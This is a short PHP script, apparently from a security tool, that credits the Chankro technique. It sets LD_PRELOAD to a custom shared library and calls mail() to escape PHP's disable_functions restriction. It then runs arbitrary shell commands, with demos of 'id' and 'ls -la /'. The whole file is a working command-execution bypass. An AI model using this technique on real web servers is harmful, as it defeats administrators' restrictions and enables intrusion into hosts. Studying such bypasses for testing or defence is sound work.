<pre><?php
// this technique has been borrowed from https://github.com/TarlogicSecurity/Chankro

function boxxy_exec($cmd) {
    $tmp = tempnam('/tmp', 'boxxy');
    putenv("AUTOBOXXY=$cmd");
    putenv("AUTOBOXXY_OUTPUT=$tmp");
    putenv('LD_PRELOAD=./../target/debug/libautoboxxy.so');
    mail('a', 'a', 'a', 'a');
    putenv('LD_PRELOAD');
    putenv('AUTOBOXXY_OUTPUT');
    putenv('AUTOBOXXY');
    $ret = file_get_contents($tmp);
    unlink($tmp);
    return $ret;
}

echo boxxy_exec('id');
echo boxxy_exec('ls -la /');
